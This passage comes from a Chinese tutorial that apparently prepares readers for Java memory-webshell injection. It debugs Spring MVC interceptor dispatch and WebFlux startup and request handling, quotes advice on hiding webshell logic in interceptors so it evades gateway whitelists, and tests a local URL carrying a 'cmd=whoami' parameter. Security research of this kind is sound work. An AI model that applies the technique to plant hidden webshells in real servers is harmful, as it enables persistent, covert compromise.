Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
registerHandlerMethod(handler, invocableMethod, mapping);


```

意思是，先用`selectInvocableMethod`方法根据`method`和`userType`选择出一个可调用的方法，这样是为了处理可能存在的代理和`AOP`的情况，确保获取到的是可直接调用的原始方法；然后把`bean`、`Method`和`RequestMappingInfo`注册进`MappingRegistry`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGIaq7pfj42SUESWWGFSZ8XYRo6F95RVaDjqtmkk7LKWEs8GfWzwehqQ/640?wx_fmt=png&from=appmsg)

到这里，`url`和`Controller`之间的关系是如何建立的问题就解决了。

#### 2.11.2.3 Spring Interceptor 引入与执行流程分析

我们回顾之前聊到的`Controller`的思路和下面的`4.1`节中所展示的`Controller`内存马，可以考虑到这样一个问题：

> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`

答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。

那就不禁要问了：这个`Spring Interceptor`和我们之前所说的`Filter`的区别是啥？

> 参考：https://developer.aliyun.com/article/925400

主要有以下六个方面：

<table><thead><tr><th>主要区别</th><th>拦截器</th><th>过滤器</th></tr></thead><tbody><tr><td>机制</td><td><code>Java</code>反射机制</td><td>函数回调</td></tr><tr><td>是否依赖<code>Servlet</code>容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对<code>action</code>请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td><code>IOC</code>容器中的访问</td><td>可以获取<code>IOC</code>容器中的各个<code>bean</code>（基于<code>FactoryBean</code>接口）</td><td>不能在<code>IOC</code>容器中获取<code>bean</code></td></tr></tbody></table>

我们在`2.10.2`节中给出的`TestInterceptor.java`的`preHandle`函数这里下断点，然后访问`http://127.0.0.1:8080/?cmd=whoami`进入调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGJmLhaEdZWgDPWm8Sys7OqhOibgKxAT0RcG6UDEWjShXbOtzWibLhtmmg/640?wx_fmt=png&from=appmsg)

一步步步入调试之后，发现进入`org.springframework.web.servlet.DispatcherServlet#doDispatch`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGicsBlXYQ2sSXToWWiaZ01sU9RXicGMJRskd6XKQvMtkjdKqNaO0XynU4A/640?wx_fmt=png&from=appmsg)

我们在`doDispatch`方法的第一行下断点，重新访问页面调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGzV3lz9PgxrSTpia4K6ibvMbbOOkjnwjGXRh9lRPZqaLdANb7tRFYC6pg/640?wx_fmt=png&from=appmsg)

看到了调用了`getHandler`这个函数，它的注释写的简单易懂：确定处理当前请求的`handler`，我们`step into`看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGbBK8KVWjEadlaZicO52v6NRda1SJM9h8puCfJhDniaotgZnsw2wa2r4Q/640?wx_fmt=png&from=appmsg)

通过遍历当前`handlerMapping`数组中的`handler`对象，来判断哪个`handler`来处理当前的`request`对象：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHSaNM2vezAfe7xnT2GJpicQO2YWOtiaibPssRVqyclZ9rCrESddyGTN1g/640?wx_fmt=png&from=appmsg)

继续步入这个函数里面所用到的`mapping.getHandler`方法，也就是`org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGdMBuATmBXJ3drmGicdYBUkZAjqJcgZ9wGWRw1X57iaVgBA7iazImraKYQ/640?wx_fmt=png&from=appmsg)

代码简单易懂，先是通过`getHandlerInternal`来获取，如果获取不到，那就调用`getDefaultHandler`来获取默认的，如果还是获取不到，就直接返回`null`；然后检查`handler`是不是一个字符串，如果是，说明可能是一个`Bean`的名字，这样的话就通过`ApplicationContext`来获取对应名字的`Bean`对象，这样就确保 `handler` 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 `initLookupPath(request)` 方法来初始化请求路径的查找；最后通过 `getHandlerExecutionChain` 方法创建一个处理器执行链。

这么看下来，这个`getHandlerExecutionChain`方法很重要，我们步入看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwa2TcEj29JDDGJfb7rJGXN9icjq6AZzhhAMziaY3pPLGB02aSk0wic02Q/640?wx_fmt=png&from=appmsg)

遍历`adaptedInterceptors`，判断拦截器是否是`MappedInterceptor`类型，如果是那就看`MappedInterceptor`是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。

再回到之前的`getHandler`方法中来，看看它的后半段：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGeSkNLtBSzjf2E1eFXngftQCF10G2LtJlwncLDmImfraIm7mzGYvYBg/640?wx_fmt=png&from=appmsg)

主要都是处理跨域资源共享（`CORS`）的逻辑，只需要知道在涉及`CORS`的时候把`request`、`executionChain`和`CORS`配置通过`getCorsHandlerExecutionChain`调用封装后返回就行了。

一步步执行回到一开始的`getHandler`中，这里就是调用`org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle`方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGLnxFCf52OpAgKPQibGleSYUSia9s1pdmmzgruiaHvpZxo0ovCzWQian25A/640?wx_fmt=png&from=appmsg)

2.12 Spring WebFlux 介绍与代码调试分析
-----------------------------

`SpringWebFlux`是`Spring Framework 5.0`中引入的新的响应式`web`框架。传统的`Spring MVC`在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，`WebFlux`引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和`WebSocket`，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，`WebFlux`可以更好地适应这种异步通信的需求。

关于`Reactive`和`Spring WebFlux`的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：

> https://zhuanlan.zhihu.com/p/559158740

`WebFlux`框架开发的接口返回类型必须是`Mono<T>`或者是`Flux<T>`。因此我们第一个需要了解的就是什么是`Mono`以及什么是`Flux`。

### 2.12.1 什么是 Mono？

`Mono`用来表示包含`0`或`1`个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在`Mono`中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在`2.10.3`节中的那张`gif`图中所看到的那样。

下面我们来看看`Mono`常用的`api`：

<table><thead><tr><th>API</th><th>说明</th><th>代码示例</th></tr></thead><tbody><tr><td><code>Mono.just(T data)</code></td><td>创建一个包含指定数据的 <code>Mono</code>。</td><td><code>Mono&lt;String&gt; mono = Mono.just("Hello, Mono!");</code></td></tr><tr><td><code>Mono.empty()</code></td><td>创建一个空的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; emptyMono = Mono.empty();</code></td></tr><tr><td><code>Mono.error(Throwable error)</code></td><td>创建一个包含错误的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException("Something went wrong"));</code></td></tr><tr><td><code>Mono.fromCallable(Callable&lt;T&gt; supplier)</code></td><td>从 Callable 创建 <code>Mono</code>，表示可能抛出异常的异步操作。</td><td><code>Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation());</code></td></tr><tr><td><code>Mono.fromRunnable(Runnable runnable)</code></td><td>从 Runnable 创建 <code>Mono</code>，表示没有返回值的异步操作。</td><td><code>Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask());</code></td></tr><tr><td><code>Mono.delay(Duration delay)</code></td><td>在指定的延迟后创建一个空的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));</code></td></tr><tr><td><code>Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier)</code></td><td>延迟创建 <code>Mono</code>，直到订阅时才调用供应商方法。</td><td><code>Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just("Deferred Result"));</code></td></tr><tr><td><code>Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos)</code></td><td>将一组 <code>Mono</code> 合并为一个 <code>Mono</code>，当其中一个出错时，继续等待其他的完成。</td><td><code>Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));</code></td></tr><tr><td><code>Mono.map(Function&lt;? super T, ? extends V&gt; transformer)</code></td><td>对 <code>Mono</code> 中的元素进行映射。</td><td><code>Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length());</code></td></tr><tr><td><code>Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer)</code></td><td>对 <code>Mono</code> 中的元素进行异步映射。</td><td><code>Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length()));</code></td></tr><tr><td><code>Mono.filter(Predicate&lt;? super T&gt; tester)</code></td><td>过滤 <code>Mono</code> 中的元素。</td><td><code>Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5);</code></td></tr><tr><td><code>Mono.defaultIfEmpty(T defaultVal)</code></td><td>如果 <code>Mono</code> 为空，则使用默认值。</td><td><code>Mono&lt;String&gt; resultMono = mono.defaultIfEmpty("Default Value");</code></td></tr><tr><td><code>Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback)</code></td><td>在发生错误时提供一个备用的 <code>Mono</code>。</td><td><code>Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just("Fallback Value"));</code></td></tr><tr><td><code>Mono.doOnNext(Consumer&lt;? super T&gt; consumer)</code></td><td>在成功时执行操作，但不更改元素。</td><td><code>Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println("Received: " + s));</code></td></tr><tr><td><code>Mono.doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td>在发生错误时执行操作。</td><td><code>Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println("Error: " + e.getMessage()));</code></td></tr><tr><td><code>Mono.doFinally(Consumer&lt;SignalType&gt; action)</code></td><td>无论成功还是出错都执行操作。</td><td><code>Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println("Processing finished: " + signal));</code></td></tr></tbody></table>

### 2.12.2 什么是 Flux？

`Flux`表示的是`0`到`N`个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地`publish`元素。也就是说，`Flux`允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。

下面是`Flux`常用的`api`：

<table><thead><tr><th>API</th><th>说明</th><th>代码示例</th></tr></thead><tbody><tr><td><strong><code>Flux.just</code></strong></td><td>创建包含指定元素的<code>Flux</code></td><td><code>Flux&lt;String&gt; flux = Flux.just("A", "B", "C");</code></td></tr><tr><td><strong><code>Flux.fromIterable</code></strong></td><td>从<code>Iterable</code>创建<code>Flux</code></td><td><code>List&lt;String&gt; list = Arrays.asList("A", "B", "C");</code><br><code>Flux&lt;String&gt; flux = Flux.fromIterable(list);</code></td></tr><tr><td><strong><code>Flux.fromArray</code></strong></td><td>从数组创建<code>Flux</code></td><td><code>String[] array = {"A", "B", "C"};</code><br><code>Flux&lt;String&gt; flux = Flux.fromArray(array);</code></td></tr><tr><td><strong><code>Flux.empty</code></strong></td><td>创建一个空的<code>Flux</code></td><td><code>Flux&lt;Object&gt; emptyFlux = Flux.empty();</code></td></tr><tr><td><strong><code>Flux.error</code></strong></td><td>创建一个包含错误的<code>Flux</code></td><td><code>Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException("Something went wrong"));</code></td></tr><tr><td><strong><code>Flux.range</code></strong></td><td>创建包含指定范围的整数序列的<code>Flux</code></td><td><code>Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5);</code></td></tr><tr><td><strong><code>Flux.interval</code></strong></td><td>创建包含定期间隔的元素的<code>Flux</code></td><td><code>Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);</code></td></tr><tr><td><strong><code>Flux.merge</code></strong></td><td>合并多个 Flux，按照时间顺序交织元素</td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br><code>Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.concat</code></strong></td><td>连接多个<code>Flux</code>，按照顺序发布元素</td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br><code>Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.zip</code></strong></td><td>将多个<code>Flux</code>的元素进行配对，生成<code>Tuple</code></td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("1", "2");</code><br><code>Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.filter</code></strong></td><td>过滤满足条件的元素</td><td><code>Flux&lt;Integer&gt; numbers = Flux.range(1, 5);</code><br><code>Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0);</code></td></tr><tr><td><strong><code>Flux.map</code></strong></td><td>转换每个元素的值</td><td><code>Flux&lt;String&gt; words = Flux.just("apple", "banana", "cherry");</code><br><code>Flux&lt;Integer&gt; wordLengths = words.map(String::length);</code></td></tr><tr><td><strong><code>Flux.flatMap</code></strong></td><td>将每个元素映射到一个<code>Flux</code>，并将结果平铺</td><td><code>Flux&lt;String&gt; letters = Flux.just("A", "B", "C");</code><br><code>Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase()));</code></td></tr></tbody></table>

### 2.12.3 Spring WebFlux 启动过程分析

本来是想先用文字聊一堆关于`Spring MVC`和`Spring WebFlux`之间的区别的，但是这个已经被网上现有的不多的关于`WebFlux`的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖`WebFlux`的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。

我们直接在`run`方法这里下断点，然后直接`step into`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGCZ349ic6GEUluic6bVGYn5c3BnLClfK34QG3QtpAdAgW3IST8NFXdFlg/640?wx_fmt=png&from=appmsg)

一步步地`step over`之后，我们可以看到调用了`org.springframework.boot.SpringApplication#createApplicationContext`这个方法（前面的那些方法并不重要，直接略过就行）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGovlGNvApSkg5sbmzsdbnuNQlr90MAX09KpQCBeQOsrb2gH7WXHmxfw/640?wx_fmt=png&from=appmsg)

这个方法光听名字`createApplicationContext`，就感觉很重要，因为字面意思就是创建`ApplicationContext`，这正是我们感兴趣的内容，我们`step into`进去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGoWLs4qQq5d498l1DZAcMfDwNibRJC4sNRqeWhFnVuGP56r6rYicXVE8Q/640?wx_fmt=png&from=appmsg)

可以看到，是根据不同的`webApplicationType`去选择创建不同的`context`，比如我们这里的`webApplicationType`就是`REACTIVE`，也就是响应式的。

我们`step into`这里的`create`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG2msWSvrE8EEy1hAbKtjErsoKgwF04bibiaBEbhiciab5ltjibElKic4B27TQ/640?wx_fmt=png&from=appmsg)

发现里面有两个静态方法、一个`create`方法和一个默认实现 `DEFAULT`，这个默认实现通过加载 `ApplicationContextFactory` 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 `AnnotationConfigApplicationContext` 实例。

我们继续`step over`走下去，可以看到我们`REACTIVE`对应的`context`是`AnnotationConfigReactiveWebServerApplicationContext`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGoJhbccDUH9J1Azc6KOT6uYbD6ZMMcjsic26B7mfN7el3SV1VDr8Ltcw/640?wx_fmt=png&from=appmsg)

继续往下走，我们会回到一开始这里，可以看到接下来会调用`prepareContext`、`refreshContext`和`afterRefresh`方法，这个过程就是一系列的初始化、监听的注册等操作：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGVickGfdiabxyiccLhEbPozxuVzV8C4icV1hoByIuIvic4kicJQeUS0iaAnV8w/640?wx_fmt=png&from=appmsg)

我们`step into`这里的`refreshContext`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG0noGEoVNnwKRyibOuLbB67wSWA3zTFY1VuJy9Uf0SnSblLYKVWjqgNA/640?wx_fmt=png&from=appmsg)

接着`step into`这里的`refresh`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxGUvdovETVssSNNHqjZq7ciaLuHpDfkayfZO7W4ElQmlMlwTZOJkEibA/640?wx_fmt=png&from=appmsg)

进来之后，接着`step into`这里的`refresh`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEjyhssmOByDfUlBwmWucO7jMW3XumUnRiafZtA3GibqCg42M6902OiaIQ/640?wx_fmt=png&from=appmsg)

可以看到，这里调用了一个`super.refresh`，也就是父类的`refresh`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG1XplgTn0BfNcjpc6NNeTCExxNBribicsPbWZp84TqLm50Ao3V1nRAoeg/640?wx_fmt=png&from=appmsg)

我们继续`step into`查看，发现这里调用了`onRefresh`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGUTfMcwZjTrSo1VXnnNUBXIptMG34q6EyoHezkq0oKEOc37ibNdEcx9g/640?wx_fmt=png&from=appmsg)

我们`step into`这里的`onRefresh`，发现它调用了关键的`org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG0fyOzdUEvjaFRg5Eaic3quJ0oCc1mTOVrn05EN7pcvcfMB0zV6K59Iw/640?wx_fmt=png&from=appmsg)

继续`step over`可以看到，由于我们使用的是`Netty`而不是`Tomcat`，因此这里最终会调用`NettyReactiveWebServerFactory`类中的`getWebServer`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGcqbGzv8IgmVjzibe5oPiah7Pmic4AN53qWDHednT7r9II70WhiaW6KGFlw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGOWcbDV1GHuvxlcKyA6FzqXE6g16lg2uhZSweGNa82O8ukqkO3BQB8g/640?wx_fmt=png&from=appmsg)

而上图中的`WebServerManager`类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象`WebServer`，另一个是上层方法处理者的抽象`DelayedInitializationHttpHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGb38D80GNWQK39rDCjOfuQ6HeLeeStCRiaiaCgIYJaDzKwkVtg0Pec8Zg/640?wx_fmt=png&from=appmsg)

那这个`webserver`具体是怎么启动的呢？我们继续走到`finishRefresh`这个方法这里来，如果这里我们直接无脑`step over`，程序最终会回到`run`方法，说明，启动`webserver`的地方肯定就在这个`finishRefresh`方法里面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGuchApDgv9ib0MaX47UWNMBK8SyavfG1YUnc1ImviaBTQq3jenXiabzYqg/640?wx_fmt=png&from=appmsg)

我们`step into`进去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGhD1w3P0GC4PLu40wsmYDyOPGIIm0GQathsx4x960gB7n7UL9Fuz10A/640?wx_fmt=png&from=appmsg)

接着`step into`去看看这里调用的`getLifecycleProcessor().onRefresh()`方法，发现调用了`startBeans`方法，并且设置了自启动：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHWyibYoFDZMx63ib2SBaoibPuKPQibP9GlQI3cY1l5B4Zibv25YFwPUb9wA/640?wx_fmt=png&from=appmsg)

我们直接`step into`这个`startBeans`方法，一步步地`step over`过后，会发现调用了`start`方法，看来我们在逐渐逼近真相：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGm0uRqo6zYZ8GwGp4BlakKwtmbrh2zT9sSa6qftgOicdHiaanG2libWnlg/640?wx_fmt=png&from=appmsg)

我们继续`step into`这个`start`方法，发现调用了`org.springframework.context.support.DefaultLifecycleProcessor#doStart`这个方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG7SCZe0lQIJswWT4lfgM5Kdya2mBYJ0Iv7vE6alJzKutYT9YxmLanEg/640?wx_fmt=png&from=appmsg)

直接`step into`进去看看，发现由于`dependenciesForBean`为 []，所以没有调用`doStart`方法，直接就是调用`bean.start()`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGooCLdpB3R2nC4TTg1YNat0wSVeK0gMXEnnw5VrPnnhYT4ibmluj5lgw/640?wx_fmt=png&from=appmsg)

继续`step into`这个`start`方法看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG0eQQRv6DJxXGOAuXib36sCiazCYgXYtLKEgk6eC09VVdryW62pzBhjYg/640?wx_fmt=png&from=appmsg)

怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGAv1CEEMCFxbaqeh1kYQ3QicXZibsUUTCoiaMeWIR6AtCwDSSw3XAQGC8w/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwU4ibbrOWZmJ6ccNKtGdgqsK9BJHhBajdbxOicZcE3fk8HFQJ5vKxzUA/640?wx_fmt=png&from=appmsg)

调试了几遍之后发现是我疏忽了，这里的`this.lifecycleBeans`里面其实有三个，每调用一次`doStart`方法就会删掉一个：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGCCo9ONrhrWblufDSPx8gK97u05Upt8rDVWYqia8ExGlkV4xKmI6XAgw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGqGgAh63EpBamsn8UJqlX6BL9jTWw77cTd7TXDewstgicuKMbTHgGNNw/640?wx_fmt=png&from=appmsg)

可以看到，我们刚才调用的是第一个`bean`的，所以当然没有启动`webserver`相关的方法了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGArleQY4c1KoEqlRic8zDBYSbMdOS3qgX1sWqTwokI9RibItGtyicLI50g/640?wx_fmt=png&from=appmsg)

我们一步步`step over`，当`memeber.name`为`webServerStartStop`时，我们再`step into`这个`doStart`方法里面的`bean.start()`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGYIngWzaXl0U0EkEtHfEMH3NBshXYwsiclWJbMWyBOkBoaBuTM5d5kyQ/640?wx_fmt=png&from=appmsg)

即可看到`this.weServerManager.start()`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG5ouTeu7VzRRSjibSdMaSJRvTVykkDQdxVWAJLdIMzfytKfGR7MGJZjw/640?wx_fmt=png&from=appmsg)

我们继续`step into`这个`start`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGXIVcft2YYyA7hiaOqVE0gY9XK5dBwria1uUycbjs8Sx3Eu7Wsy4ZkEMA/640?wx_fmt=png&from=appmsg)

仔细看看上面红框中的代码，先是初始化`HttpHandler`，这个方法其实根据`lazyInit`的值的不同来决定何时初始化，如果`lazyInit`值为`true`，那么就等第一次请求到来时才真正初始化；如果为`false`，那么就在 `WebServerManager` 的 `start` 方法中调用 `initializeHandler` 直接初始化：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGB3NhX3j2ML7u7hQGiajHA3KhhFciaexOR90vzeT4V5tATtiaDwVUOn7vg/640?wx_fmt=png&from=appmsg)

我们继续步入这里的`start`方法，发现其位置为`org.springframework.boot.web.embedded.netty.NettyWebServer#start`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEzZkU2tjtPQ26J69QWRAWzician0PEZEof6TjHFCPYoqgjlKHg44Zj1w/640?wx_fmt=png&from=appmsg)

到这里才算真正明了，真正的`webServer`启动的关键方法是`org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG9UcBO5Gfca6MVz3l7hy1IDq6JE0Hwecz8Lq3I4hMbeW4nPmjdyHL1A/640?wx_fmt=png&from=appmsg)

从下面的`this.webServer`中也可以看到，绑定的是`0.0.0.0:9191`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGafD4vMpN2Juekmy4QSUh49ZCRqQYMJJibibVZbn4Iia42yMDEKO3hKX2Q/640?wx_fmt=png&from=appmsg)

### 2.12.4 Spring WebFlux 请求处理过程分析

当一个请求过来的时候，`Spring WebFlux`是如何进行处理的呢？

这里我们在`org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello`这里打上断点，然后进行调试，访问`http://127.0.0.1:9191/hello`触发`debug`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGa2n8ibOKAh8g2lPU6vvfmPfQ0Z9VK2ksRYicUKykqCun0lLo8F7kqfHQ/640?wx_fmt=png&from=appmsg)

一步步地`step over`后来到`org.springframework.web.reactive.DispatcherHandler#invokeHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGgicdMNTHFgJqicPP4VsvJCo8NOtG6pHQ6RQnJh7qT6qSvWet0R0JlVYw/640?wx_fmt=png&from=appmsg)

`step into`之后可以看到是`org.springframework.web.reactive.DispatcherHandler#handle`：

